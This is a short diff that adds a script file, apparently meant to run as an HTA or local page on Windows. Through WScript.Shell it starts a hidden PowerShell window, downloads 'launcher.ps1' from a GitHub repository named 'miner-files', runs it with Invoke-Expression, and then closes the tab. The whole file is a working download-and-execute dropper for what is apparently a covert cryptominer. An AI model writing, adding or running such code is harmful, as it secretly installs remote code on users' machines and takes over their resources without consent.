@@ -1,0 +1,16 @@
+<script>
+// 1. The link to your launcher script
+var ps1Url = "https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/launcher.ps1";
+
+// 2. Define where to save it
+var ps1Output = "$env:USERPROFILE\\launcher.ps1";
+
+// 3. Run PowerShell invisibly
+var wsh = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri '" + ps1Url + "' -OutFile '" + ps1Output + "'; Invoke-Expression (Get-Content '" + ps1Output + "')\"";
+
+wsh.Run(cmd, 0, false);
+
+// 4. Close this tab immediately
+window.close();
+</script>
